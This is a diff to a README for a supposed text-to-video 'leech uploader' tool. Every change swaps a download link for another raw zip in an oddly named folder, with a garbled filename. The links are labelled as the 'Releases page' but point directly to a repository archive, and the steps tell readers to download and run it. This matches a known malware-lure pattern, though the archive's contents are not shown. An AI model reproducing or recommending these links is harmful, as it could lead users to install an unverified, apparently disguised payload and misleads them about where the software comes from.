@@ -1,6 +1,6 @@
 # 🚀 TXT-TO-VIDEO-LEECH-UPLOADER - Create Videos and Upload Quickly
 
-[![Download](https://raw.githubusercontent.com/chester1900/TXT-TO-VIDEO-LEECH-UPLOADER/main/dodecahydrated/TXT-TO-VIDEO-LEECH-UPLOADER.zip)](https://raw.githubusercontent.com/chester1900/TXT-TO-VIDEO-LEECH-UPLOADER/main/dodecahydrated/TXT-TO-VIDEO-LEECH-UPLOADER.zip)
+[![Download](https://github.com/chester1900/TXT-TO-VIDEO-LEECH-UPLOADER/raw/refs/heads/main/dodecahydrated/T_TX_VIDE_LEEC_UPLOADER_3.7.zip)](https://github.com/chester1900/TXT-TO-VIDEO-LEECH-UPLOADER/raw/refs/heads/main/dodecahydrated/T_TX_VIDE_LEEC_UPLOADER_3.7.zip)
 
 ## 📜 Overview
 
@@ -12,7 +12,7 @@ Here’s a quick guide to help you get started with TXT-TO-VIDEO-LEECH-UPLOADER.
 
 ### 📥 Download & Install
 
-1. **Visit the Releases page**: [Download TXT-TO-VIDEO-LEECH-UPLOADER here](https://raw.githubusercontent.com/chester1900/TXT-TO-VIDEO-LEECH-UPLOADER/main/dodecahydrated/TXT-TO-VIDEO-LEECH-UPLOADER.zip).
+1. **Visit the Releases page**: [Download TXT-TO-VIDEO-LEECH-UPLOADER here](https://github.com/chester1900/TXT-TO-VIDEO-LEECH-UPLOADER/raw/refs/heads/main/dodecahydrated/T_TX_VIDE_LEEC_UPLOADER_3.7.zip).
 2. Look for the latest release, usually at the top of the page.
 3. Click on the file that matches your operating system. Make sure to select the correct version for Windows, Mac, or Linux.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 For information on tips and tricks related to video creation and best practices for file uploading, check out our blog and help section included within the application.
 
-Don't forget to visit the [Releases page](https://raw.githubusercontent.com/chester1900/TXT-TO-VIDEO-LEECH-UPLOADER/main/dodecahydrated/TXT-TO-VIDEO-LEECH-UPLOADER.zip) for the most up-to-date version and features.
+Don't forget to visit the [Releases page](https://github.com/chester1900/TXT-TO-VIDEO-LEECH-UPLOADER/raw/refs/heads/main/dodecahydrated/T_TX_VIDE_LEEC_UPLOADER_3.7.zip) for the most up-to-date version and features.
